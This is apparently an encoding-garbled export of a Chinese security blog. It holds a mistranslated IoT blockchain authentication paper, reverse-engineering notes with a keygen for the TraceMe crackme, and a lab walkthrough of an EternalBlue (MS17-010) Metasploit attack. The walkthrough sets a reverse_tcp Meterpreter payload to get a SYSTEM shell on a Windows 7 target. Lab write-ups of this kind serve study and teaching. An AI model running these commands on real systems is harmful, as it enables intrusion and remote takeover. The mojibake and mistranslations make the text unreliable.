æ„Ÿå™¨ä¹‹é—´çš„èº«ä»½éªŒè¯è¿‡ç¨‹ï¼Œå­˜å‚¨å‘é€å’Œæ¥æ”¶çš„å…ƒç´ ï¼Œå¹¶æ‰¾åˆ°ä¸æœ€ç»ˆå•†å®šçš„å¯†é’¥ç›¸åŒçš„å¯†é’¥ è®¤è¯å¯†é’¥[22]ã€‚ æ‹’ç»æœåŠ¡æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…è¿›è¡Œçš„æ”»å‡» å‚ä¸èº«ä»½éªŒè¯è¿‡ç¨‹å¹¶æ‹¦æˆª å³ä½¿ä¼ æ„Ÿå™¨æˆ–ç”¨æˆ·è¯·æ±‚èº«ä»½éªŒè¯ä¹Ÿå¯ä»¥åšå‡ºå“åº”ï¼Œ ä»è€Œæ‹’ç»èº«ä»½éªŒè¯æœåŠ¡ã€‚ éšç§ä¾µå®³æ˜¯ä¸€ç§ä¾µçŠ¯éšç§çš„è¡Œä¸ºï¼Œå®ƒé€šè¿‡ä»å‘é€çš„å…ƒç´ ä¸­æš´éœ²å‡ºå‚ä¸é€šä¿¡çš„ä¸»ä½“ å¹¶åœ¨ä¼ æ„Ÿå™¨ä¸Šçš„èº«ä»½éªŒè¯è¿‡ç¨‹ä¸­æ”¶åˆ° ç½‘ç»œã€‚ 2.4Attack modelï¼ˆæ”»å‡»æ¨¡å‹ ï¼‰æœ¬ç ”ç©¶ä¸­çš„æ”»å‡»æ¨¡å‹å¯ä»¥æ˜¯DoSæ”»å‡»ã€‚ åœ¨DoSä¸­ æ”»å‡»ï¼Œæ”»å‡»è€…æ­£è¯•å›¾é€ƒé¿æˆ–å†’å…… é€šè¿‡å‘é€ä¼ªè£…çš„å‡æ¶ˆæ¯æ¥åˆæ³•çš„IoTè®¾å¤‡ ä½œä¸ºåˆæ³•çš„ç‰©è”ç½‘è®¾å¤‡ã€‚ ç±»ä¼¼çš„æƒ…å†µå¯èƒ½åœ¨ ç‚¹å¯¹ç‚¹ç½‘ç»œä¹Ÿæ˜¯å¦‚æ­¤ã€‚ ä¾‹å¦‚ï¼Œåˆæ³•çš„ç‰©è”ç½‘ è¿æ¥åˆ°å…¶ä»–ç‰©è”ç½‘è®¾å¤‡çš„èŠ‚ç‚¹è®¾å¤‡ï¼Œå…¶ä¸­ä¸€äº› å¯èƒ½æ˜¯åˆæ³•çš„ï¼Œè€Œå…¶ä»–äººå¯èƒ½æ˜¯æ¶æ„çš„ã€‚ è¿™å¯èƒ½ æœ€ç»ˆå¯¼è‡´ç½‘ç»œæ‹¥å¡å¹¶æ‹’ç»æŸäº›ç‰©è”ç½‘ è®¾å¤‡è®¿é—®ä¸€äº›æ•°æ®æµã€‚ é—®é¢˜æ˜¯ å°†å½±å“ç‰©è”ç½‘è®¾å¤‡çš„è®¤è¯è¿‡ç¨‹ã€‚ å› æ­¤ï¼Œä¸é›†ä¸­å¼ç³»ç»Ÿç›¸æ¯”ï¼Œæ”»å‡»è€… æ­£åœ¨å¤„ç†æ‰€æœ‰éƒ½å…·æœ‰çš„ç‰©è”ç½‘è®¾å¤‡ åŒºå—é“¾çš„å½“å‰çŠ¶æ€ã€‚ å› æ­¤ï¼Œå¯ä»¥å¾—å‡ºç»“è®º DoSæ”»å‡»å¾ˆéš¾é€šè¿‡å¯¹ç­‰ç½‘ç»œè¿›è¡Œï¼Œä»¥æŸå®³æ•´ä¸ªç½‘ç»œçš„å®‰å…¨æ€§ ç‰©è”ç½‘æ•°é‡ä¼—å¤šå¯¼è‡´ç½‘ç»œå’ŒåŒºå—é“¾ è®¾å¤‡ã€‚ 3 Blockchain-based sensor node authenticationä½œè€…åº”è¯¥æœ‰è¶³å¤Ÿçš„èƒŒæ™¯ä¿¡æ¯æ¥ æä¾›æœ¬æ–‡ä¸­æ‰€å»ºè®®æ–¹æ³•çš„æ›´å¤šæ¥å— 3.1 Blockchainå› ä¸ºä»»ä½•å‚ä¸ä½¿ç”¨åŒºå—é“¾çš„äºº å¯ä»¥è¾“å…¥ï¼Œæ›´æ”¹æˆ–åˆ é™¤æ•°æ®ï¼ŒTTPï¼ˆä¿¡ä»»ç¬¬ä¸‰æ–¹ï¼‰ ä¸éœ€è¦å­˜åœ¨å°±å¯ä»¥åœ¨ä¸è¯šå®çš„ç½‘ç»œå„æ–¹ä¹‹é—´è¿›è¡Œäº¤æ˜“ã€‚ä¸ºäº†éªŒè¯è¿™ç§äº¤æ˜“ï¼Œä½¿ç”¨å…±è¯†ç®—æ³•ï¼Œå¯ä»¥ä¿è¯å­˜å‚¨åœ¨å…¶ä¸­çš„æ•°æ®çš„å¯é æ€§ ç»è¿‡æˆæƒç”¨æˆ·ä¹‹é—´ç‰¹å®šæœºåˆ¶æ“ä½œåçš„åŒºå—é“¾ã€‚ä»è€Œå®‰å…¨åœ°æ›´æ–°å’Œç»´æŠ¤ åŒºå—é“¾çš„çŠ¶æ€ï¼Œç¡®ä¿ åŒºå—é“¾å›¾1å°†ç”µå­ç¡¬å¸å®šä¹‰ä¸º æ•°å­—ç­¾åã€‚æ¯ä¸ªæˆå‘˜å°†ç¡¬å¸è½¬å‘åˆ°ä¸‹ä¸€ä¸ª é€šè¿‡æ•°å­—ç­¾åå…ˆå‰äº¤æ˜“çš„å“ˆå¸Œå€¼å’Œ ä¸‹ä¸€ä¸ªæˆå‘˜çš„å…¬å…±å¯†é’¥ï¼Œå°†å®ƒä»¬æ·»åŠ åˆ° ç¡¬å¸ã€‚æ”¶æ¬¾äººå¯ä»¥éªŒè¯ç­¾åä»¥éªŒè¯ æˆå‘˜èµ„æ ¼[14]ã€‚åŒºå—é“¾å¦‚å›¾1æ‰€ç¤ºã€‚ å½“å‰å—çš„å€¼ï¼Œæ•°å­—ç­¾åï¼Œå“ˆå¸Œå€¼ å¯¹ç­‰ç½‘ç»œã€‚åº”ç”¨ï¼ˆ2020ï¼‰13ï¼š579â€“589 581 å½“å‰å—ï¼Œå—æ ‡é¢˜å’ŒMerkleæ ¹ä»¥åŠå— æ•°æ®ç”±äº¤æ˜“ç»„æˆã€‚ é—®é¢˜æ˜¯æ”¶ä»¶äººæ— æ³•éªŒè¯å…¶ä¸­ä¹‹ä¸€ ä¸šä¸»ä¸æ˜¯åŒèŠ±ç¡¬å¸ã€‚å¸¸è§çš„è§£å†³æ–¹æ¡ˆæ˜¯ ä»‹ç»ä¸€ä¸ªå¯é çš„ä¸­å¤®æœºæ„ï¼Œè–„è·ï¼Œäº¤æ˜“ åŒé‡æ”¯å‡ºã€‚æ¯æ¬¡äº¤æ˜“åå¿…é¡»è¿”å› ç¡¬å¸é€ å¸å‚ã€‚ æˆ‘ä»¬ç›¸ä¿¡ä¸ä¼šå‘è¡Œæ–°ç¡¬å¸ï¼Œåªä¼šå‘è¡Œç¡¬å¸ ç”±Mint1ç›´æ¥å‘è¡Œçš„å°†è¢«é‡å¤ä½¿ç”¨ã€‚ä¸é—®é¢˜ è¿™ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯æ•´ä¸ªç¬æ—¶ç³»ç»Ÿçš„å‘½è¿ã€‚ å…¬å¸éœ€è¦ç»è¥é€ å¸å‚ï¼Œå¹¶å°†å…¶å…¨éƒ¨é€šè¿‡ äº¤æ˜“é€šè¿‡é“¶è¡Œè¿›è¡Œã€‚æ”¶ä»¶äººä»¥å‰æ²¡æœ‰ç­¾ç½²è¿‡å…ˆå‰çš„ä¼šå‘˜äº¤æ˜“ã€‚åˆ¶ä½œçš„å”¯ä¸€æ–¹æ³• ç¡®ä¿æ²¡æœ‰æ¶‰åŠæ‰€æœ‰äº¤æ˜“çš„äº¤æ˜“ã€‚åŸºäºè–„è· æ¨¡å‹ï¼Œè–„è·çŸ¥é“æ‰€æœ‰äº¤æ˜“ã€‚æˆ‘å†³å®šåˆ°è¾¾ ç¬¬ä¸€ã€‚ä¸ºäº†åœ¨æ²¡æœ‰å¯ä¿¡ä»»æ–¹çš„æƒ…å†µä¸‹å®ç°è¿™ä¸€ç›®æ ‡ï¼Œå…¬å¼€å®£å¸ƒäº†ä»–ä»¬æ”¶åˆ°çš„è®¢å•ã€‚åœ¨æ¯æ¬¡äº¤æ˜“æ—¶ï¼Œå¤§å¤šæ•°èŠ‚ç‚¹éƒ½åŒæ„è¿™æ˜¯ç¬¬ä¸€æ¬¡[14]ã€‚ æ„æˆåŒºå—é“¾çš„åŒºå—ç”±åŒºå—ç»„æˆ æ ‡å¤´å’Œå—ä½“ã€‚å—å¤´åŒ…å«å“ˆå¸Œ å‰ä¸€ä¸ªå—æ ‡é¢˜çš„å€¼ï¼Œæ‰€æœ‰å—éƒ½æ˜¯ é€šè¿‡é“¾è¡¨ä¹‹ç±»çš„é“¾è¡¨æ–¹æ³•è¿æ¥èµ·æ¥ï¼Œå¹¶ä¸” åŒ…æ‹¬ç”¨äºå…±è¯†çš„ä»»æ„éšæœºæ•° è°ƒæ•´å—ç”Ÿæˆéš¾åº¦çš„ç®—æ³•å’Œä½ã€‚å—ä½“å¯ä»¥å…·æœ‰ä¸åŒçš„å€¼ï¼Œå…·ä½“å–å†³äº ä»–ä»¬æ”¯æŒçš„æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œåœ¨æ¯”ç‰¹å¸ä¸­ï¼Œæ•°å­— å¯†ç ç³»ç»Ÿï¼Œç”¨æˆ·ä¹‹é—´å‘ç”Ÿçš„äº¤æ˜“ å—ä½“ä¸­åŒ…å«10åˆ†é’Ÿã€‚åŒºå—é“¾å¯èƒ½ æˆä¸ºå…¬å…±åŒºå—é“¾ï¼Œç§æœ‰åŒºå—é“¾ï¼Œè´¢å›¢ åŒºå—é“¾å¯ä»¥åˆ†ä¸ºä¸‰ç±»[15]ã€‚æ¯ä¸ªå—ä½“ ç£·åœ¨ç»“æ„ä¸Šå®Œå…¨ç›¸ä¼¼ã€‚ä½†æ˜¯ï¼Œä»–ä»¬ å…·æœ‰ä¸åŒçš„æ¦‚å¿µå’ŒåŠŸèƒ½ï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªåŒºå—é“¾ä¸Šå®šä¹‰å’Œå®ç°ä¹Ÿæœ‰å…ˆå†³æ¡ä»¶ã€‚ å…¬å…±åŒºå—é“¾æ˜¯ç”¨äºæ™®éä½¿ç”¨çš„åŒºå—é“¾ è¢«ç§°ä¸ºæ¯”ç‰¹å¸ï¼Œä»¥åŠç§æœ‰åŒºå—é“¾æˆ–è´¢å›¢ åŒºå—é“¾æ˜¯å°†åŒºå—é“¾ç”¨äºå…¶ä»–æ–¹é¢çš„æ¦‚å¿µ ç›®çš„ã€‚ 3.2 Conventional IoT sensor nodes authentication typesåœ¨ç‰©è”ç½‘ç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…ä¼ªè£…æˆç‰©è”ç½‘ å…·æœ‰å„ç§æ”»å‡»ï¼ˆä¾‹å¦‚æ”»å‡»ï¼Œé‡ç”¨æ”»å‡»ï¼Œ å’ŒDoSæ”»å‡»è¢«å…è®¸è®¿é—®å†…éƒ¨ ç‰©è”ç½‘ç¯å¢ƒã€‚ åœ¨ç°æœ‰çš„ç‰©è”ç½‘ç¯å¢ƒä¸­ï¼Œæœ‰äº”ç§ä¸åŒçš„ èº«ä»½éªŒè¯åè®®çš„ç±»å‹ã€‚ è¡¨1æ˜¾ç¤ºäº†ä¼˜ç‚¹ æ¯ç§è®¤è¯æŠ€æœ¯çš„åˆ©å¼Š[15]ã€‚ 3.2.1 ID-based authenticationåŸºäºIDçš„èº«ä»½éªŒè¯é€šè¿‡ä½¿ç”¨ç”¨æˆ·çš„ç”µå­é‚®ä»¶åœ°å€ï¼Œåç§°ï¼ŒIPåœ°å€æä¾›æ•°å­—ç­¾åå’Œèº«ä»½éªŒè¯ ä½œä¸ºå…¬é’¥å¯†ç ç³»ç»Ÿã€‚ é¢„åˆ†é…çš„å¯†é’¥ä¸æ˜¯ éœ€è¦ã€‚ è®¡ç®—é‡å°ï¼Œå¯†é’¥é•¿åº¦ä¸º æ¯”è¾ƒçŸ­ã€‚ ä½†æ˜¯ï¼Œå®ƒå®¹æ˜“å—åˆ°IDæ¬ºéª—æ”»å‡»çš„æ”»å‡»ã€‚ æœ‰èµ«æ–¯ç®—æ³•ï¼Œæ—æ©ç®—æ³•ï¼Œç»…å£« å›¾1äº¤æ˜“ä¸­çš„åŒºå—é“¾ 1 Mintæ˜¯åŸºäºDebianå’ŒUbuntuçš„Linuxå‘è¡Œç‰ˆï¼Œå¾ˆå®¹æ˜“ é‡‡ç”¨ã€‚ 582å¯¹ç­‰ç½‘ç»œ åº”ç”¨ ï¼ˆ2020ï¼‰13ï¼š579â€“589 å’ŒSilverbergçš„ç®—æ³•ï¼Œä»¥åŠå„ç§èº«ä»½éªŒè¯ æ–¹æ¡ˆ[15]ã€‚ 3.2.2 Certificate-based authenticationä¸€ç§ä½¿ç”¨æ•°å­—ç­¾åè¿›è¡Œè®¤è¯çš„æ–¹æ³• å…¬é’¥å¯†ç ç³»ç»Ÿï¼Œå°†ç”¨äºç”µå­ç­¾åçš„ä¿¡æ¯è®°å½•åœ¨è¯ä¹¦ä¸­ï¼Œå¹¶æ ¹æ®è¯¥ä¿¡æ¯æ‰§è¡Œèº«ä»½éªŒè¯ã€‚ åœ¨éŸ©å›½ï¼Œæœ‰å…³ å·²é€šè¿‡ã€Šæ•°å­—ç­¾åæ³•ã€‹å‡†å¤‡äº†å‘è¡Œç³»ç»Ÿå’Œæˆæƒè¯ä¹¦çš„ç®¡ç† æˆç«‹äº1999å¹´ï¼Œå¹¶é¢å‘äº†è¯ä¹¦ ç”±æ ¹CAè¿›è¡Œæœ€é«˜çº§åˆ«çš„è®¤è¯ æœºæ„é€šè¿‡äº”ä¸ªæˆæƒçš„è®¤è¯æœºæ„ã€‚ åœ¨å¤–é¢ åœ¨æ•´ä¸ªå›½å®¶ï¼ŒVerisignçš„è®¾å¤‡è®¤è¯æœåŠ¡åŒ…æ‹¬ ä¸ªäººè®¾å¤‡ï¼Œç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨è®¾å¤‡è®¤è¯ï¼Œä»¥åŠ WiMAXè¡Œä¸šè®¤è¯ã€‚ å¦å¤–ï¼ŒåŸºäºè¯ä¹¦ èº«ä»½éªŒè¯æŠ€æœ¯æ­£åœ¨VoIPï¼Œç½‘ç»œç›‘æ§æ‘„åƒå¤´ç­‰ä¸­ä½¿ç”¨ï¼Œå¹¶ä¸”è¯¥é¢†åŸŸæ­£åœ¨é€æ­¥æ‰©å¤§ã€‚ åŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯æŠ€æœ¯æä¾›äº†å¾ˆé«˜çš„ é€šè¿‡å¼ºå¤§çš„èº«ä»½éªŒè¯åŠŸèƒ½å®ç°å®‰å…¨æ€§å¹¶æä¾›ä¸å¯å¦è®¤æ€§ã€‚ ä½†æ˜¯ï¼Œè®¾å¤‡è¯ä¹¦å¤„ç† è½¯ä»¶å’Œç®—æ³•éœ€è¦å¾ˆé«˜çš„è®¡ç®—ååé‡ã€‚ å› æ­¤ï¼Œå®ƒä¸é€‚åˆç”¨äºä½åŠŸè€—ï¼Œä½æ€§èƒ½çš„ç‰©è”ç½‘è®¾å¤‡ã€‚ 3.2.3 Cryptography protocol based3.2.4 MAC address based authentication3.2.5 ID/password-based authentication4 Proposed P2P networking based IoT sensor authentication by Blockchain4.1 Requirements4.2 Device authentication method4.3 Hacking scenario on IoT authentication4.3.1 Jamming attack assumption4.4 Proposed IoT authentication by Blockchain4.5 Proposed IoT multiple-level node authentication model5 Conclusions","categories":[],"tags":[{"name":"translation","slug":"translation","permalink":"https://singlemindedt.github.io/tags/translation/"}]},{"title":"ç®€å•é€†å‘","slug":"ç®€å•é€†å‘","date":"2020-05-11T08:32:31.000Z","updated":"2020-05-14T17:03:28.570Z","comments":true,"path":"2020/05/11/ç®€å•é€†å‘/","link":"","permalink":"https://singlemindedt.github.io/2020/05/11/ç®€å•é€†å‘/","excerpt":"","text":"ç¨‹åºä¸€ã€å­—èŠ‚åºç¨‹åºæºç 12345678910111213#include\"windows.h\"BYTE b=0x12; WORD w=0x1234;DWORD dw=0x123456; char str[]=\"abcde\";int main() &#123; byte lb=b; WORD lw=w; DWORD ldw=dw; char *lstr=str; return 0; &#125; +++ è¡¥å……å°ç«¯åºï¼ˆ Littie endianï¼‰ï¼šä½åœ°å€å­˜æ”¾ä½å­—èŠ‚ï¼Œé«˜åœ°å€å­˜æ”¾é«˜å­—èŠ‚ï¼Œç¬¦åˆäººç±»æ€ç»´ï¼ˆåœ°å€0x100å¤„ï¼Œå­˜å‚¨æ•´æ•°0x01234567ï¼‰ åœ°å€ â€¦ 0x100 0x101 0x102 0x103 â€¦ å€¼ â€¦ 0x67 0x45 0x23 0x01 â€¦ å¤§ç«¯åºï¼ˆBig endianï¼‰:ä½åœ°å€å­˜æ”¾é«˜å­—èŠ‚ï¼Œé«˜åœ°å€å­˜æ”¾ä½å­—èŠ‚ åœ°å€ â€¦ 0x100 0x101 0x102 0x103 â€¦ å€¼ â€¦ 0x01 0x23 0x45 0x67 â€¦ +++ ä»£ç åˆ†æ TYPE Name SIZE å¤§ç«¯åºç±»å‹ å°ç«¯åºç±»å‹ BYTE b 1 12 12 WORD w 2 12 34 34 12 DWORD dw 4 12 34 [56] [78] [78] [56] 34 12 char[] str 6 [61] [62] [63] [64] [65] [00] [61] [62] [63] [64] [65] [00] å¯¹äºchar[]å­—ç¬¦æ•°ç»„ï¼Œåœ¨å†…å­˜ä¸­è¿ç»­ï¼Œä¸ç®¡å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºï¼Œå­˜å‚¨é¡ºåºéƒ½æ˜¯ä¸€æ ·çš„ x86ç³»åˆ—CPUæ˜¯å°ç«¯åºï¼› PowerPCæ˜¯å¤§ç«¯åº; ç½‘ç»œåè®®ä¹Ÿé‡‡ç”¨å¤§ç«¯åºï¼ˆå¤§ç«¯åºä¹Ÿç§°ç½‘ç»œå­—èŠ‚åº) +++ è°ƒè¯• ç¯å¢ƒ:x32dbg mainå‡½æ•°æ±‡ç¼–ä»£ç : ç¨‹åºæ‰§è¡Œè‡³0x4013EB leaveæ—¶çš„ç¨‹åºæ ˆ: ç›¸åº”çš„å‡½æ•°æ ˆå¸§: ESP 0022FF40 00401920 lstråœ°å€ 0022FF44 00402008 ldw 0022FF48 00123456 bå’Œw 0022FF4C 12FD1234 0022FF50 0000000A 0022FF54 00000002 EBP 0022FF58 0022FFF0 è¿”å›åœ°å€ 0022FF5C 004010FD å¯„å­˜å™¨çŠ¶æ€ï¼ŒEAX=0è¡¨ç¤ºreturn 0è¯­å¥ +++ ç¨‹åºäºŒã€æ ˆçš„è„æ•°æ®ç¨‹åºæºç 123456789101112#include&lt;stdio.h&gt;void f1()&#123; int a=1,b=2,c=3;&#125;void f2()&#123; int a,b,c; printf(\"a=%d,b=%d,c=%d\\n\",a,b,c);&#125;int main()&#123; f1(); f2();&#125; +++[3]:() +++ è¡¥å……å‡½æ•°æ ˆé€€å‡ºä»¥åï¼ŒåŸæœ‰æ ˆç©ºé—´é‡Œçš„å±€éƒ¨å˜é‡ä¸ä¼šè¢«è‡ªåŠ¨æ¸…é™¤ï¼Œæˆä¸ºæ ˆçš„å™ªéŸ³æˆ–è„æ•°æ®ã€‚+++ è°ƒè¯• ç¯å¢ƒ:x32dbg f1(),f2()æ±‡ç¼–ä»£ç : å½“ç¨‹åºæ‰§è¡Œè‡³0x4013CB leaveï¼ˆf1()å‡½æ•°å¯¹åº”å‚æ•°å‡å·²å…¥æ ˆï¼‰æ—¶ï¼Œå¯¹åº”æ ˆå¸ƒå±€: ç›¸åº”çš„å‡½æ•°æ ˆå¸§: ESP 0022FF38 0022FFF0 c 0022FF3C 00000003 b 0022FF40 00000002 a 0022FF44 00000001 EBP 0022FF48 0022FF58 è¿”å›åœ°å€ 0022FF4C 00401406 å½“ç¨‹åºè¿è¡Œè‡³0x4013F4ï¼ˆf2()å‡½æ•°å‚æ•°å‡å·²å…¥æ ˆï¼‰æ—¶ï¼Œæ­¤æ—¶æ ˆå¸ƒå±€: å¯¹åº”çš„å‡½æ•°æ ˆå¸§ï¼š ESPï¼ˆprintfç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ 0022FF20 00403064 f2 a 0022FF24 00000003 f2 b 0022FF28 0022FFF0 f2 c 0022FF2C 00401950 0022FF30 77C04E42 0022FF34 00401950 0022FF38 0022FFF0 f1 c 0022FF3C 00000003 f1 b 0022FF40 00000002 f1 a 0022FF44 00000001 EBP 0022FF48 0022FF58 è¿”å›åœ°å€ 0022FF4C 0040140B +++ ç¨‹åºä¸‰ã€å…³äºAT&amp;Tå’ŒIntelç¨‹åºæºç 12345678910#include&lt;stdio.h&gt;int main()&#123; int i; for(i=0;i&lt;10;i++) &#123; printf(\"Hello,World\\n\"); &#125; return 0;&#125; åœ¨kalié‡Œåˆ›å»ºtest0.cæ–‡ä»¶ï¼› AT&amp;Tè¯­æ³• Intelè¯­æ³•+++ ç¨‹åºå››ã€linuxä¸‹64ï¼Œ32ç¨‹åºæºç 123456789101112#include&lt;stdio.h&gt;void test_function(int a,int b,int c,int d)&#123; int flag; char buffer[10]; flag=31337; buffer[0]='A';&#125;int main()&#123; test_function(1,2,3,4);&#125; +++ 64ä½ç‰ˆæœ¬ï¼Œå¯çœ‹å‡ºmainå‡½æ•°ä¸­1,2,3,4åˆ†åˆ«å­˜å‚¨åœ¨å¯„å­˜å™¨edi,esi,edx,ecxä¸­ï¼›test_functionå‡½æ•°ä¸­é€šè¿‡ä¸Šè¿°å››ä¸ªå¯„å­˜å™¨å°†å€¼å­˜å‚¨åœ¨æ ˆä¸­; [11]:()+++ æ‰§è¡Œè‡³0x55555555515bå¤„,å³test_functionå‡½æ•°ï¼› è¿›å…¥test_functionå‡½æ•°å†…éƒ¨ï¼› æ‰§è¡Œè‡³popæ“ä½œå¤„ï¼š æ­¤æ—¶çš„æ ˆï¼š å¯¹åº”çš„æ ˆå¸§å¦‚ä¸‹è¡¨ï¼š rsp e1b0 0x00007fffffffe1c0 e1c0 0x0000555555555170 æœ€åä¸€å­—èŠ‚ä¸ºbuffer0 e1d0 0x0000000000000000 e1e0 0x0000000100040000 rbp e1f0 0x0000000000000000 +++ ç¨‹åº5ã€TraceMe.exeæ±‡ç¼–ä»£ç æ ¹æ®GetDlgItemTextAå‡½æ•°æ‰¾åˆ°ç¨‹åºçš„å…³é”®ä»£ç å¤„ï¼š è¾“å…¥ç”¨æˆ·å1234567,åºåˆ—å·08173144; å‘ç°eaxä¿å­˜åºåˆ—å·é•¿åº¦ï¼Œebxä¿å­˜ç”¨æˆ·åé•¿åº¦: test al,alåˆ¤æ–­ç”¨æˆ·åç¬¬ä¸€å­—èŠ‚æ˜¯å¦ä¸ºç©ºï¼Œç©ºçš„è¯è·³è½¬ã€‚ åˆ†æåå¾—çŸ¥0X0040138Fä¸ºè·³è½¬åˆ¤æ–­æ˜¯å¦è¾“å…¥æ­£ç¡®ï¼Œå¦‚ä¸‹ä»£ç ï¼š å¯ä»¥ç›´æ¥æŒ‰ç…§00401347â€”â€”00401378å†™å‡ºæ³¨å†Œæœºï¼› +++ åºåˆ—å·ç”Ÿæˆç®—æ³•ï¼š 123456789101112131415161718#include&lt;iostream&gt;#include&lt;string.h&gt;using namespace std;int main()&#123; char s[15]; cin&gt;&gt;s; char arr[]=&#123;0x0c,0x0a,0x13,0x09,0x0c,0x0b,0x0a,0x0b&#125;; int r=0; int len=strlen(s); for (int i=3,j=0;j&lt;len;i++,j++) &#123; if(j&gt;7) j=0; r+=s[i]*arr[j]; &#125; cout&lt;&lt;r;&#125; è¿˜æ˜¯ä»¥ç”¨æˆ·å1234567ï¼Œå¾—åˆ°åºåˆ—å·ï¼š Check: æˆåŠŸï¼ +++ ç¨‹åºå…­ã€è°ƒç”¨stdcallã€fastcallâ€¦1.stdcallç¤ºä¾‹ä»£ç ï¼š 12345678910#include&lt;stdio.h&gt;void __stdcall demo_cdecl(int x,int y,int z,int w)&#123; int sum=x+y+z+w;&#125;int main()&#123; demo_cdecl(1,2,3,4); return 0;&#125; +++ æ±‡ç¼–ä»£ç ï¼š x32dbg è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§ï¼š 2.fastcallç¤ºä¾‹ä»£ç ï¼š 12345678910#include&lt;stdio.h&gt;void __fastcall demo_cdecl(int x,int y,int z,int w)&#123; int sum=x+y+z+w;&#125;int main()&#123; demo_cdecl(1,2,3,4); return 0;&#125; +++ æ±‡ç¼–ä»£ç ï¼š è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§ï¼š +++ 3.cdeclç¤ºä¾‹ä»£ç ï¼š 12345678910#include&lt;stdio.h&gt;void __cdecl demo_cdecl(int x,int y,int z,int w)&#123; int sum=x+y+z+w;&#125;int main()&#123; demo_cdecl(1,2,3,4); return 0;&#125; +++ æ±‡ç¼–ä»£ç ï¼š è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§ï¼š +++ 4.thiscallç¤ºä¾‹ä»£ç ï¼š 1234567891011121314#include&lt;stdio.h&gt;class CSum&#123; public: int Add(int a,int b) &#123; return a+b; &#125; &#125;;int main()&#123; CSum sum; sum.Add(1,2);&#125; +++ æ±‡ç¼–ä»£ç ï¼š è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§ï¼š +++ 5.64ä½æ“ä½œç³»ç»Ÿç¤ºä¾‹ä»£ç ï¼š 123456789#include&lt;stdio.h&gt;int Add(int n1,int n2,int n3,int n4,int n5,int n6)&#123; return n1+n2+n3+n4+n5+n6;&#125;int main()&#123; printf(\"%d\\r\\n\",Add(1,2,3,4,5,6));&#125; +++ Mainå‡½æ•°ï¼š Addå‡½æ•°ï¼š +++ 6.64ä½gccmainå‡½æ•°ï¼Œ6ä¸ªå‚æ•°ä»å·¦å‘å³æ”¾å…¥å¯„å­˜å™¨:rdi,rsi,rdx,rcx,r8,r9 Addå‡½æ•°ï¼š 7.è™šå‡½æ•°è°ƒç”¨å®ä¾‹ä»£ç ï¼š 12345678910111213141516171819#include&lt;stdio.h&gt;class CSum&#123; public: virtual int Add(int a,int b) &#123; return a+b; &#125; virtual int Sub(int a,int b) &#123; return a-b; &#125;&#125;;int main()&#123; CSum* pCSum=new CSum; pCSum-&gt;Add(1,2); pCSum-&gt;Sub(1,2);&#125; +++ Mainå‡½æ•°æ±‡ç¼–ï¼š","categories":[],"tags":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://singlemindedt.github.io/tags/é€†å‘/"}]},{"title":"åˆ©ç”¨æ°¸æ’ä¹‹è“è·å–meterpretershell","slug":"åˆ©ç”¨æ°¸æ’ä¹‹è“è·å–meterpretershell","date":"2020-05-10T11:49:35.000Z","updated":"2020-05-11T08:24:25.408Z","comments":true,"path":"2020/05/10/åˆ©ç”¨æ°¸æ’ä¹‹è“è·å–meterpretershell/","link":"","permalink":"https://singlemindedt.github.io/2020/05/10/åˆ©ç”¨æ°¸æ’ä¹‹è“è·å–meterpretershell/","excerpt":"","text":"å®éªŒç¯å¢ƒï¼š æ”»å‡»æœºï¼šKaliï¼ˆ192.168.40.128ï¼‰ é¶æœºï¼šWin7ï¼ˆ192.168.40.142ï¼‰ +++ æ”»å‡»è¿‡ç¨‹ï¼š å¼€å¯msf 1msfconsole æƒ…æŠ¥æœé›†ï¼Œé¦–å…ˆç¡®å®šç›®æ ‡æ˜¯å¦å¼€æ”¾445ç«¯å£ï¼Œæ¼æ´Ms17-010æ˜¯å¦å­˜åœ¨ 1nmapæ¢æµ‹ä¸»æœºä¿¡æ¯ï¼šnmap -sV 192.168.40.142 445ç«¯å£å¼€æ”¾ï¼Œç›®çš„ä¸»æœºä¸ºwindows7ç³»ç»Ÿï¼Œæ¨æµ‹å­˜åœ¨ms17-010æ¼æ´; åˆ©ç”¨msfçš„è¾…åŠ©æ¨¡å—auxiliaryè¿›è¡Œæ¼æ´éªŒè¯ 1search ms17-010 æœç´¢ç›¸å…³æ¼æ´æ¨¡å—å¾—åˆ°5æ¡ç»“æœï¼Œæœ‰è¿œç¨‹Windowså‘½ä»¤æ‰§è¡Œã€è¿œç¨‹Windowså†…æ ¸æŸåã€ä»£ç æ‰§è¡Œç­‰ï¼Œæ­¤å¤„ä½¿ç”¨auxiliary/scanner/smb/smb_ms17_010 è¿›è¡ŒéªŒè¯ï¼› é…ç½®åŸºæœ¬ä¿¡æ¯ï¼š 123use auxiliary/scanner/smb/smb_ms17_010set rhost 192.168.40.142set rport 445 è¿è¡Œæ¢æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨ï¼š 1run æ ¹æ®ç»“æœï¼Œå­˜åœ¨è¯¥æ¼æ´ã€‚ æ¸—é€æ”»å‡» ä½¿ç”¨æ¸—é€æ”»å‡»ï¼ˆexploitï¼‰æ¨¡å—ï¼› è®¾ç½®æ”»å‡»ç›®æ ‡åœ°å€+ç«¯å£ã€æœ¬æœºåœ°å€ 1use exploit/windows/smb/ms17_010_eternalblue 123set rhost 192.168.40.142set rport 445set lhost 192.168.40.128 è®¾ç½®payload 1set payload windows/x64/meterpreter/reverse_tcp æŸ¥çœ‹é…ç½®å®Œæ•´æ€§ 1show options åœ¨Exploit targetsä¸­å¯çœ‹åˆ°win7å’Œserver 2008 r2éƒ½é€‚ç”¨ï¼› æ”»å‡» 1run å¯ä»¥çœ‹åˆ°ï¼Œç›´æ¥å¾—åˆ°äº†é¶æœºsystemæƒé™ï¼Œå¹¶ç»™å‡ºäº†shellç•Œé¢ã€‚ +++ å†å›å¤´çœ‹çœ‹æˆ‘ä»¬çš„payloadï¼š 1set payload windows/x64/meterpreter/reverse_tcp 